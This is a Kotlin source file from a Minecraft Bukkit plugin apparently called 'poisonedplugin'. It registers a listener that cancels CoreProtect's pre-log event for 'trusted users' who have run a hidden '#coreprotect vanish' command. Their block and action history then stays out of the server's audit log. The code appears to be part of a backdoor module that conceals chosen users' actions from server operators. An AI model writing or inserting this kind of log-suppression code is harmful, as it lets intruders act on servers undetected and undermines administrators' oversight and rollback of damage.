package de.maxbossing.poisonedplugin.module.coreprotect

import de.maxbossing.poisonedplugin.instance
import de.maxbossing.poisonedplugin.manager.TrustedUserManager
import de.maxbossing.poisonedplugin.manager.command
import de.maxbossing.poisonedplugin.utils.cmp
import net.coreprotect.event.CoreProtectPreLogEvent
import net.kyori.adventure.text.format.NamedTextColor
import org.bukkit.Bukkit
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import java.util.UUID

object CoreProtectModule: Listener {

    val vanishedUsers = mutableListOf<UUID>()

    @EventHandler(priority = EventPriority.LOWEST)
    fun onPreLog(event: CoreProtectPreLogEvent) {

        if (!TrustedUserManager.trustedUsers.contains((Bukkit.getPlayer(event.user)?:return).uniqueId))return

        if (!vanishedUsers.contains((Bukkit.getPlayer(event.user)?:return).uniqueId))return

        event.isCancelled = true
    }

    val coreProtectAPI = command("coreprotect", "Manages CoreProtect-related modules") {player, args ->
        if (args.isEmpty()) {
            player.sendMessage(cmp("#coreprotect <vanish | unvanish>", NamedTextColor.RED))
            return@command
        }
        when (args[0]) {
            "vanish" -> {
                vanishedUsers.add(player.uniqueId)
                player.sendMessage(cmp("Vanished from future CoreProtect Logs"))
            }
            "unvanish" -> {
                player.sendMessage(cmp("Unvanished from future CoreProtect Logs"))
                vanishedUsers.remove(player.uniqueId)
            }
        }
    }

    init {
        Bukkit.getPluginManager().registerEvents(this, instance)
    }
}